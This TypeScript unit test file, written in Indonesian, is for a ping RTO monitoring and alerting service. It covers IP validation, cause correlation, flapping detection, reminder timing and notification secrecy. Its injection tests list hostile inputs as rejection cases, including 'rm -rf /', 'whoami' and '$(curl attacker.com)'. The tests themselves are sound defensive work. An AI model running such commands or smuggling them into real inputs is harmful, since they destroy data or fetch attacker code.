import { test, describe, after } from "node:test";
import assert from "node:assert";
import { isValidIp } from "../src/monitoring/ping";
import { getSuspectedCause } from "../src/notifications";
import { createDeviceSchema } from "../src/devices";
import { redis } from "../src/redis";
import { queryClient } from "../src/db";

describe("Langkah 3: Ping RTO Monitoring, Flapping, & Security Unit Tests", () => {
  after(async () => {
    try {
      await redis.quit();
    } catch {}
    try {
      await queryClient.end();
    } catch {}
    setTimeout(() => process.exit(0), 100);
  });

  describe("1. Validasi IP & Proteksi Command Injection", () => {
    test("Menolak input injeksi shell '1.1.1.1; ls'", () => {
      assert.strictEqual(isValidIp("1.1.1.1; ls"), false);
      const parsed = createDeviceSchema.safeParse({
        name: "Test Injeksi",
        type: "mikrotik",
        ipAddress: "1.1.1.1; ls",
      });
      assert.strictEqual(parsed.success, false);
    });

    test("Menolak input injeksi shell dengan operator &&, |, backtick, subshell", () => {
      assert.strictEqual(isValidIp("192.168.1.1 && whoami"), false);
      assert.strictEqual(isValidIp("10.0.0.1 | rm -rf /"), false);
      assert.strictEqual(isValidIp("`reboot`"), false);
      assert.strictEqual(isValidIp("$(curl attacker.com)"), false);
      assert.strictEqual(isValidIp("192.168.1.1\nwhoami"), false);
      assert.strictEqual(isValidIp(""), false);
      assert.strictEqual(isValidIp("   "), false);
    });

    test("Menerima alamat IPv4 dan IPv6 valid", () => {
      assert.strictEqual(isValidIp("192.168.88.1"), true);
      assert.strictEqual(isValidIp("10.10.10.1"), true);
      assert.strictEqual(isValidIp("8.8.8.8"), true);
      assert.strictEqual(isValidIp("127.0.0.1"), true);
      assert.strictEqual(isValidIp("::1"), true);
      assert.strictEqual(isValidIp("2001:db8::1"), true);
    });
  });

  describe("2. Dugaan Penyebab dari Korelasi Ping & Log", () => {
    test("RTO + log berhenti -> 'Perangkat mati atau jaringan putus'", () => {
      const cause = getSuspectedCause({ isPingOk: false, isLogActive: false });
      assert.strictEqual(cause, "Perangkat mati atau jaringan putus");
    });

    test("RTO + log masih masuk -> 'Ping diblokir, perangkat masih hidup'", () => {
      const cause = getSuspectedCause({ isPingOk: false, isLogActive: true });
      assert.strictEqual(cause, "Ping diblokir, perangkat masih hidup");
    });

    test("Ping normal + log berhenti -> 'Layanan pengirim log berhenti'", () => {
      const cause = getSuspectedCause({ isPingOk: true, isLogActive: false });
      assert.strictEqual(cause, "Layanan pengirim log berhenti");
    });

    test("Ping normal + log aktif -> 'Status perangkat normal'", () => {
      const cause = getSuspectedCause({ isPingOk: true, isLogActive: true });
      assert.strictEqual(cause, "Status perangkat normal");
    });
  });

  describe("3. Pemicu Ambang RTO & Pemulihan (Threshold Engine)", () => {
    interface PingEngineState {
      failCount: number;
      successCount: number;
      isRto: boolean;
      rtoStartedAt?: number | null;
      lastReminderTime?: number;
      hasSent30mReminder?: boolean;
      flips?: number[];
    }

    function evaluatePingState(
      state: PingEngineState,
      pingOk: boolean,
      failureThreshold: number = 3,
      currentTimestamp: number = Date.now()
    ): {
      state: PingEngineState;
      event: "ping_rto" | "ping_recovered" | "flapping_detected" | null;
      durationText?: string;
    } {
      let event: "ping_rto" | "ping_recovered" | "flapping_detected" | null = null;
      let durationText: string | undefined = undefined;

      if (!pingOk) {
        state.failCount = (state.failCount || 0) + 1;
        state.successCount = 0;

        if (state.failCount >= failureThreshold && !state.isRto) {
          state.isRto = true;
          state.rtoStartedAt = currentTimestamp;
          state.hasSent30mReminder = false;
          state.lastReminderTime = 0;
          event = "ping_rto";

          state.flips = (state.flips || []).filter((t) => currentTimestamp - t <= 1800000);
          state.flips.push(currentTimestamp);
        }
      } else {
        state.successCount = (state.successCount || 0) + 1;
        state.failCount = 0;

        if (state.isRto && state.successCount >= 2) {
          state.isRto = false;
          const startMs = state.rtoStartedAt || currentTimestamp;
          const durationMinutes = Math.max(1, Math.round((currentTimestamp - startMs) / 60000));
          durationText = `RTO berlangsung selama ${durationMinutes} menit`;
          event = "ping_recovered";

          state.rtoStartedAt = null;
          state.hasSent30mReminder = false;
          state.lastReminderTime = 0;

          state.flips = (state.flips || []).filter((t) => currentTimestamp - t <= 1800000);
          state.flips.push(currentTimestamp);
        }
      }

      // Evaluasi flapping (>4 kali perubahan status dalam 30 menit)
      if (event && (state.flips || []).length > 4) {
        return {
          state,
          event: "flapping_detected",
          durationText: "Terjadi perubahan status bolak-balik lebih dari 4 kali dalam 30 menit.",
        };
      }

      return { state, event, durationText };
    }

    test("Gagal 1-2 kali tidak memicu RTO (Ambang default = 3)", () => {
      let state: PingEngineState = { failCount: 0, successCount: 0, isRto: false };

      // Gagal ke-1
      let res = evaluatePingState(state, false, 3);
      assert.strictEqual(res.state.isRto, false);
      assert.strictEqual(res.event, null);
      assert.strictEqual(res.state.failCount, 1);

      // Gagal ke-2
      res = evaluatePingState(res.state, false, 3);
      assert.strictEqual(res.state.isRto, false);
      assert.strictEqual(res.event, null);
      assert.strictEqual(res.state.failCount, 2);
    });

    test("Gagal sesuai ambang (ke-3 kali) memicu tepat 1 event 'ping_rto'", () => {
      let state: PingEngineState = { failCount: 2, successCount: 0, isRto: false };

      // Gagal ke-3
      const res = evaluatePingState(state, false, 3);
      assert.strictEqual(res.state.isRto, true);
      assert.strictEqual(res.event, "ping_rto");
      assert.strictEqual(res.state.failCount, 3);

      // Gagal ke-4 saat sudah RTO tidak memicu event rto baru
      const res2 = evaluatePingState(res.state, false, 3);
      assert.strictEqual(res2.state.isRto, true);
      assert.strictEqual(res2.event, null);
    });

    test("Saat dalam RTO: sukses 1 kali tetap RTO, 2 kali sukses memicu 'ping_recovered'", () => {
      const startTime = Date.now() - 10 * 60 * 1000; // 10 menit lalu
      let state: PingEngineState = {
        failCount: 3,
        successCount: 0,
        isRto: true,
        rtoStartedAt: startTime,
      };

      // Sukses ke-1
      let res = evaluatePingState(state, true, 3);
      assert.strictEqual(res.state.isRto, true);
      assert.strictEqual(res.event, null);
      assert.strictEqual(res.state.successCount, 1);

      // Sukses ke-2
      res = evaluatePingState(res.state, true, 3);
      assert.strictEqual(res.state.isRto, false);
      assert.strictEqual(res.event, "ping_recovered");
      assert.ok(res.durationText?.includes("10 menit"));
      assert.strictEqual(res.state.rtoStartedAt, null);
    });

    test("Proteksi Flapping: >4 perubahan status dalam 30 menit memicu 'flapping_detected'", () => {
      const now = Date.now();
      let state: PingEngineState = {
        failCount: 0,
        successCount: 0,
        isRto: false,
        flips: [now - 20000, now - 15000, now - 10000, now - 5000], // sudah ada 4 flip sebelumnya
      };

      // Flip ke-5 memicu RTO
      const res = evaluatePingState(state, false, 1, now);
      assert.strictEqual(res.event, "flapping_detected");
      assert.ok(res.durationText?.includes("lebih dari 4 kali"));
    });
  });

  describe("4. Logika Pengingat Berkala RTO (Anti-Spam)", () => {
    function evaluateReminder(
      rtoStartedAt: number,
      now: number,
      hasSent30m: boolean,
      lastReminderTime: number
    ): { sendReminder: boolean; is30m: boolean; is2h: boolean } {
      const elapsedMinutes = Math.floor((now - rtoStartedAt) / 60000);
      const timeSinceLastReminder = now - lastReminderTime;

      let sendReminder = false;
      let is30m = false;
      let is2h = false;

      if (elapsedMinutes >= 30 && !hasSent30m) {
        sendReminder = true;
        is30m = true;
      } else if (elapsedMinutes > 30 && timeSinceLastReminder >= 2 * 3600 * 1000) {
        sendReminder = true;
        is2h = true;
      }

      return { sendReminder, is30m, is2h };
    }

    test("Pengingat tidak terkirim sebelum 30 menit", () => {
      const now = Date.now();
      const started = now - 15 * 60 * 1000; // 15 menit
      const res = evaluateReminder(started, now, false, 0);
      assert.strictEqual(res.sendReminder, false);
    });

    test("Pengingat 30 menit terkirim tepat setelah 30 menit", () => {
      const now = Date.now();
      const started = now - 31 * 60 * 1000; // 31 menit
      const res = evaluateReminder(started, now, false, 0);
      assert.strictEqual(res.sendReminder, true);
      assert.strictEqual(res.is30m, true);
    });

    test("Pengingat tidak dobel antara menit 31 hingga 120", () => {
      const now = Date.now();
      const started = now - 60 * 60 * 1000; // 60 menit
      const lastSent = now - 30 * 60 * 1000; // dikirim 30 menit lalu
      const res = evaluateReminder(started, now, true, lastSent);
      assert.strictEqual(res.sendReminder, false);
    });

    test("Pengingat berkala terkirim setiap 2 jam berikutnya", () => {
      const now = Date.now();
      const started = now - 155 * 60 * 1000; // 2.5 jam
      const lastSent = now - 121 * 60 * 1000; // dikirim > 2 jam lalu
      const res = evaluateReminder(started, now, true, lastSent);
      assert.strictEqual(res.sendReminder, true);
      assert.strictEqual(res.is2h, true);
    });
  });

  describe("5. Keamanan Format Pesan Notifikasi", () => {
    test("Pesan tidak membocorkan token, secret, atau password", () => {
      const dummyPayload = {
        deviceName: "Router-Core-1",
        deviceIp: "192.168.1.1",
        startTimeWib: "05/11/2026, 08:30:00",
        durationText: "RTO berlangsung selama 5 menit",
        suspectedCause: "Perangkat mati atau jaringan putus",
        deviceUrl: "https://jagalog.example.com/perangkat/dev-123",
      };

      const title = `[PERINGATAN] Ping RTO: ${dummyPayload.deviceName}`;
      const messageText = `
<b>${title}</b>
<b>Nama Perangkat:</b> ${dummyPayload.deviceName}
<b>Alamat IP:</b> ${dummyPayload.deviceIp || "HTTP Ingest"}
<b>Waktu Mulai:</b> ${dummyPayload.startTimeWib} WIB
${dummyPayload.durationText ? `<b>Durasi:</b> ${dummyPayload.durationText}\n` : ""}<b>Dugaan Penyebab:</b> ${dummyPayload.suspectedCause}
<b>Dashboard:</b> <a href="${dummyPayload.deviceUrl}">${dummyPayload.deviceUrl}</a>
      `.trim();

      assert.ok(!messageText.includes("password"));
      assert.ok(!messageText.includes("secret"));
      assert.ok(!messageText.includes("token"));
      assert.ok(!messageText.includes("botToken"));
      assert.ok(messageText.includes("Router-Core-1"));
      assert.ok(messageText.includes("192.168.1.1"));
      assert.ok(messageText.includes("Perangkat mati atau jaringan putus"));
      assert.ok(messageText.includes("/perangkat/dev-123"));
    });
  });
});
